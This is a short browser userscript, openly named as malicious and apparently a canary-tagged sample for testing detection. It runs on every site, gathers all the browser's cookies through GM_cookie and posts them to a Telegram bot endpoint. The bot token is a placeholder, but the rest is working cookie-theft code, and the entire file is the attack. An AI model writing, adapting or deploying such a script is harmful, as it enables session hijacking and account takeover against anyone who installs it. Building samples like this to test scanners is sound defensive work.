// ==UserScript==
// @name         mal gmcookie telegram
// @namespace    canary.invalid
// @version      1.0
// @match        *://*/*
// @grant        GM_cookie
// @grant        GM_xmlhttpRequest
// @connect      api.telegram.org
// ==/UserScript==
GM_cookie.list({}, (cookies) => {
  GM_xmlhttpRequest({method:"POST", url:"https://api.telegram.org/bot000000:CANARY_not_a_real_token_xxxxxxxxxxxxxx/sendMessage", data: JSON.stringify(cookies)});
});
